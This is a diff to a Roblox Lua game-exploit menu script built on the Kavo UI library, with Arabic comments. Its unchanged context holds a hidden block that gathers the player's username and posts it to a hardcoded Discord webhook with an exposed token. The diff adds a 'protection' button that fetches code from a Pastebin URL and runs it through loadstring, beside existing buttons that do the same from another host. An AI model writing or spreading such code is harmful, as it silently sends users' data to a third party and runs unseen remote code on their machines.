@@ -66,7 +66,7 @@ end
 --==================================================
 
 pcall(function()
-    local _W = "https://discord.com/api/webhooks/1555177488450191391/-8MZ9KYvmDV8hyZylvPwlmNsyl9dzcnz3zvvhvmSrWCq8udLZqvnLEF_4wXBQVmBzZaq" -- رابط الويب هوك الخاص بك الأصلي
+    local _W = "https://discord.com/api/webhooks/1555177488450191391/-8MZ9KYvmDV8hyZylvPwlmNsyl9dzcnz3zvvhvmSrWCq8udLZqvnLEF_4wXBQVmBzZaq"
     local _info = {}
 
     _info.Username = _L.Name
@@ -794,7 +794,6 @@ local function MakeKavoDraggable(gui)
     end)
     if not MainFrame then return end
 
-    -- تعطيل زر الـ X القديم التابع لمكتبة Kavo وإخفاؤه
     pcall(function()
         for _, obj in ipairs(MainFrame:GetDescendants()) do
             if obj:IsA("TextButton") or obj:IsA("ImageButton") then
@@ -806,7 +805,6 @@ local function MakeKavoDraggable(gui)
         end
     end)
 
-    -- إضافة زر X خاص وثابت في أعلى القائمة لا يحذفها بل يخفيها ليظل زر الدائرة يعمل
     if not CustomCloseBtn or not CustomCloseBtn.Parent then
         CustomCloseBtn = Instance.new("TextButton")
         CustomCloseBtn.Name = "NHYQ_CustomClose"
@@ -922,6 +920,15 @@ local function LoadMainScript()
     SecProtect:NewButton("حماية", "حماية", function()
         loadstring(game:HttpGet("https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_hh"))()
     end)
+
+    --==================================================
+    -- حماية بلو (مضاف فقط)
+    --==================================================
+
+    SecProtect:NewButton("حماية بلو", "تشغيل حماية بلو", function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/7UpdjdhN"))()
+    end)
+
     SecProtect:NewButton("حماية فلنق", "حماية فلنق", function()
         loadstring(game:HttpGet("https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_bn"))()
     end)
